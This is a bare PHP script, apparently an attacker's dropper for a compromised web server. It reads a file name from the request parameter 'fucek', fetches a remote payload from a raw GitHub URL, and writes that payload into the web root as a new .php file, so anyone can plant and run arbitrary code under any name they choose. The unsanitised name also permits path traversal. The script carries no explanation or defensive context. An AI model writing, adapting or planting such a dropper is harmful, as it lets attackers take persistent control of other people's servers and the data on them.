<?php
$fucek = $_REQUEST['fucek'];
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = "./".$fucek.".php" ;
$text = http_get('https://raw.githubusercontent.com/boters/PythonBot/master/files/s.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo "Done Reset ===>  ".$check."</br>";
}else 
echo "Fail Reset" ;
?>
